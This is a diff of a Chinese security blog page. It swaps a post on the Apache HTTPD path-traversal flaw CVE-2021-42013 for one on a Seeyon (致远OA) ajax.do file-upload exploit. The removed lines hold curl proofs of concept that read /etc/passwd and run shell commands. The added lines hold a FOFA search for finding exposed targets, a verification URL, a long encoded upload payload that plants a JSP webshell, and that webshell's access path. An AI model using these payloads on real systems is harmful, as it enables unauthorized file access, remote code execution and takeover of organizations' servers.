@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Apache HTTPD 路径穿越漏洞 CVE-2021-42013, Lucky">
+    <meta name="keywords" content="致远OA ajax.do文件上传改进版, Lucky">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Apache HTTPD 路径穿越漏洞 CVE-2021-42013 | Lucky</title>
+    <title>致远OA ajax.do文件上传改进版 | Lucky</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -205,7 +205,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = 'e05eed6f2ffd00d07427073039db10c2ee7b2daca59a3d20fa5ccc5b487fe2a1';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -218,12 +218,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Apache HTTPD 路径穿越漏洞 CVE-2021-42013</h1>
+                    <h1 class="description center-align post-title">致远OA ajax.do文件上传改进版</h1>
                 </div>
             </div>
         </div>
@@ -342,16 +342,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Apache/">
-                                <span class="chip bg-color">Apache</span>
+                            <a href="/tags/%E8%87%B4%E8%BF%9COA/">
+                                <span class="chip bg-color">致远OA</span>
                             </a>
                         
-                            <a href="/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/">
-                                <span class="chip bg-color">路径穿越</span>
-                            </a>
-                        
-                            <a href="/tags/RCE/">
-                                <span class="chip bg-color">RCE</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                <span class="chip bg-color">文件上传</span>
                             </a>
                         
                     </div>
@@ -362,8 +358,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                漏洞复现
+                            <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" class="post-category">
+                                信息安全
                             </a>
                         
                     </div>
@@ -389,14 +385,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    287
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -415,18 +411,25 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。</p>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>满足下面两个条件的Apache服务器将会受到影响：</p>
-<ul>
-<li>版本等于<code>Apache/2.4.49</code>、<code>Apache/2.4.50</code></li>
-<li>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</li>
-</ul>
-<p>利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="文件读取POC（注意-icons目录-必须是可访问的）"><a href="#文件读取POC（注意-icons目录-必须是可访问的）" class="headerlink" title="文件读取POC（注意 icons目录 必须是可访问的）"></a>文件读取POC（注意 <strong>icons目录</strong> 必须是可访问的）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://127.0.0.1:8183//icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">app</span><span class="token operator">=</span><span class="token string">"Yonyou-Seeyon-OA"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://i.loli.net/2021/10/12/9hBR8LEImGUjKgT.png" alt="image-20211012164141881"></p>
-<h3 id="执行命令POC（注意：服务器上必须开启-cgi-或-cgid）"><a href="#执行命令POC（注意：服务器上必须开启-cgi-或-cgid）" class="headerlink" title="执行命令POC（注意：服务器上必须开启 cgi 或 cgid）"></a>执行命令POC（注意：服务器上必须开启 <strong>cgi</strong> 或 <strong>cgid</strong>）</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">'http://127.0.0.1:8183/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'</span> --data <span class="token string">'echo Content-Type: text-plain; echo; id'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1、使用下方url验证漏洞是否存在</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&amp;managerMethod=validate&amp;managerName=formulaManager&amp;requestCompress=gzip&amp;S=ajaxColManager&amp;M=colDelLock&amp;arguments=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://i.loli.net/2021/10/12/KFHmr26ETyQOGjf.png" alt="image-20211012164402714"></p>
+<p><br>若漏洞存在则会显示如下图</p>
+<p><img src="https://i.loli.net/2021/10/12/hWQ64sBinc8ExT5.png" alt="image-20211012173702684"></p>
+<p>2、文件上传EXP</p>
+<p>使用下面EXP进行文件上传</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&amp;managerMethod=validate&amp;managerName=formulaManager&amp;requestCompress=gzip&amp;S=ajaxColManager&amp;M=colDelLock&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00mTks%C2%9AL%14%C3%BE%2B%C2%8C_43-A%C2%94%C2%A4%C2%BE%C2%99%7E%08D%10%2F%C2%A4%0A.%C2%B0%C2%9D%7E%C2%80%5D%22%C2%8B%C3%8B%C2%A5.%28%C2%90%C3%A9%7F%7FW1m%C3%9A%C3%89%C2%A7s%C3%99%C3%A7%5Cx%0E%C3%A7%7C%7F%C3%AD%C2%BF%C3%A4%C2%87%C2%B4%C2%A2%C2%81%C3%93%14Q%C3%BF%3Fa%C3%B8Ix%C3%B3XAz%C3%B6%C3%B4%7F%06u%16%C3%9E%C3%9D%C3%B5%C3%BF%C2%BCL%C3%AB%C3%A2%101F%C3%B2%C3%AC%C3%BC%C2%9E%04%C3%87%40%24%C2%B9%C3%B8%C3%AD%40%C2%B2%C3%92%3D%C2%902%3A%08%C3%85%1F%5D%16%C2%BE%0AYt%12%3E%C2%80%0Dz%C2%A2x%7B%C2%8A%C3%82%C2%A0%28%C3%98-%C2%8B%C2%A2%26%C3%8Fn%C2%99R%C3%9F%C2%9F%C3%84%C2%84%15%C2%BD%C2%9B%07%C2%BB%C3%A4%C3%98%C2%9D%C3%80%C3%A2%C2%88R%C2%9E%C2%A5%C3%B7M%03%C2%8F%C3%88%C3%903h%C2%ABE%C3%A8%C2%A9G%C2%94%C2%AD%27fZ%C3%848%C2%9DV%C3%98%C3%9B%14%C2%A16%C3%BE%C2%B94%C3%8E%C2%B6%3E%5E%C2%A6V%13y%C2%AA%146%1F%C3%B9%C2%94%16%19+Y%C2%92%C2%9C%C3%8C%C2%9D%C3%B1%C2%97%C2%B9%C2%AD%27%C2%A1%C2%A1%C2%B7%C2%A8Q%C2%81i%C2%8016%40%05g%C2%AB%C3%9DZ%C2%AEc4%C2%B2V%C2%A1%C2%AC%C3%AF%C2%A17%C2%BF%07v%C3%BCt%C3%81I%C3%B5%C3%91w7%14%115Yxe%C2%8B%3D%C2%95%C3%ABq%C2%B2p%C3%8A%09%C2%9A%01%12%1A41%C2%A7%16%C3%B3%3D%C2%AB5%0D%C2%94%C3%BB%19%C2%95x%C3%8F%C2%A1%C3%A7%C2%9AE4%C2%9AS%3C%03MH%C3%94k%C2%9C%C2%B2%C2%87.%2C%C3%82%14t%C2%B9%C2%9B%C2%98%2C%C2%9F%1E%C2%99O%14%06%5D%25%C3%83%C3%86%C2%AEx%1E%0D%27%C2%97%3E%5D%C2%9A%C2%9AZ%C3%9C%40O%1FB%C3%8F%C2%92%C2%96%29%C2%A6x%3A%C2%A4%C3%98%C2%88%C2%8FP%C3%9B%15%C3%8B%14%C3%94%C3%98%C3%95%19jvd%3B%C2%9D8%403%0B%C3%9E%C2%9F%C2%83gs%C2%9E%1F%C3%AD%C2%82V%22%C3%90Y%0F%C2%A1%C2%B3j%C2%9E%5DH%C3%BD%04%C3%AC%C2%9F%1Ds%C3%A8%13%C3%B3%1E%C3%89%C2%A0E2%3D%C2%86D9q.%5D%C3%9F%C2%AD%C2%87%C3%90%C3%9E%11l%C2%9B%2Ch%C3%B6%C3%B7k%C2%99%C2%9E%02%034%C2%A6%C2%B1%C2%9A%C2%BC%C3%A9%5D%7DZ%C2%A1%C3%91%26%0ES%C2%8B.%C2%B4%C2%B9%C2%BA%01%2B%C3%82yH%C2%96%29%C2%AD%02o%C2%9D%C2%AFH%5DA%0F%C3%AD%C2%B62HP%0A%24%5B%06%C3%8Av%C2%A4R%C2%BF%C2%89%0F%5D%C3%BC%5C%C3%A1%7C%C2%B7%0Bm%C3%8F%C3%8C%C2%BD%C2%AEo%1B%C3%9E%C2%B3S%5Eb8%C3%9FR%60%C3%90%C2%B6%C3%83u%7Cr%5C%05e+%C3%BD%3D%1B3_%C3%98%C3%9C%C3%9F%C3%84%C2%BC%C3%AE%C3%A6%C2%B8%C3%A1%C2%B5%7D%C3%B7%C2%94sNG%C3%A6%C3%8C%1A%C3%B2o*%03%C3%8FJ%C2%96%C3%BB%C2%B9%C2%BA%C2%95%C2%B6%C2%B25%C3%9DP_%C2%9E%5C%C3%A3%C3%8E%C3%BC%5BGh%00%0D%C2%BB0%3D%C3%BB%C3%90%C2%85G%C3%90bM%C3%89%C2%A0%C2%B7%C2%B1%C2%A1%C3%BBVCi%C3%8E%C2%BAc%C3%90%C2%8AsS%C3%B0%C2%9A%C2%9Cs%C2%85b%C3%A9%3D%07%C2%BC%0F%3E%1F%C3%8E_%C2%BB%C2%98%C2%A91%C3%AF%C3%B5%29%C2%94%15%09z%C2%B1t%C3%BE%3F%C3%B8%1C%C2%BF%C3%B6%1EX%C2%95%C2%89%29aHT%1F%C3%AD%C3%A9%C3%9D%C3%B8%29B9%C3%A6k%C2%83%C2%AF%C2%B2%C3%9B%C2%98%C2%8FA%C2%83%C3%9F%7B%C3%91%C2%A1%C2%AFF%17%C3%92%19%C2%83k%1E%C2%B1%C2%93j%C3%B5%C3%B2%C3%82%C3%A3.kt%C3%B3%C2%A9%C2%B7u%C3%B4%C3%8F_%C3%B8v%C2%BD%C3%9FQ%C3%B1b%C3%90l%C3%B0%3E%C3%A7%3F%10Ds%16%C3%B1%C3%AA%C2%BF%1E%C2%AE%17%C2%81%C3%AB8z%11X%19%C2%94%04%09%C3%AB%C2%A0%C2%B6%C3%94%C3%81%C3%8Dk%C3%BF%17%3F%14%C3%BCX%C2%BC%C2%9Eey%C2%A8%C2%A2%C3%BE%C2%8F%C3%BF%01%5B%7FD%3Ff%04%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><br>上传成功如下图所示</p>
+<p><img src="https://i.loli.net/2021/10/12/rlMKb41oiZfNBPL.png" alt="image-20211012173625769"></p>
+<p>3、上传webshell地址（冰蝎3默认JSP木马）</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">/seeyon/s5x7w.jsp;Jsessionid=getAjaxDataServlet?S=ajaxColManager&amp;M=colDelLock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.loli.net/2021/10/12/MowersagUuqXO5i.png" alt="image-20211012173443135"></p>
 <h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>感谢现在努力的自己。</p>
 
                 
@@ -454,7 +457,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://1uckyun.github.io/2021/10/12/apache-httpd-lu-jing-chuan-yue-lou-dong/">https://1uckyun.github.io/2021/10/12/apache-httpd-lu-jing-chuan-yue-lou-dong/</a>
+                    <a href="https://1uckyun.github.io/2021/10/12/zhi-yuan-oa-ajax-do-wen-jian-shang-chuan-gai-jin-ban/">https://1uckyun.github.io/2021/10/12/zhi-yuan-oa-ajax-do-wen-jian-shang-chuan-gai-jin-ban/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -492,16 +495,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Apache/">
-                                    <span class="chip bg-color">Apache</span>
+                                <a href="/tags/%E8%87%B4%E8%BF%9COA/">
+                                    <span class="chip bg-color">致远OA</span>
                                 </a>
                             
-                                <a href="/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/">
-                                    <span class="chip bg-color">路径穿越</span>
-                                </a>
-                            
-                                <a href="/tags/RCE/">
-                                    <span class="chip bg-color">RCE</span>
+                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+                                    <span class="chip bg-color">文件上传</span>
                                 </a>
                             
                         </div>
@@ -547,9 +546,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/12/zhi-yuan-oa-ajax-do-wen-jian-shang-chuan-gai-jin-ban/">
                     <div class="card-image">
@@ -567,9 +567,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -582,6 +582,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -601,7 +602,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2021/10/12/apache-httpd-lu-jing-chuan-yue-lou-dong/">
@@ -635,7 +636,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
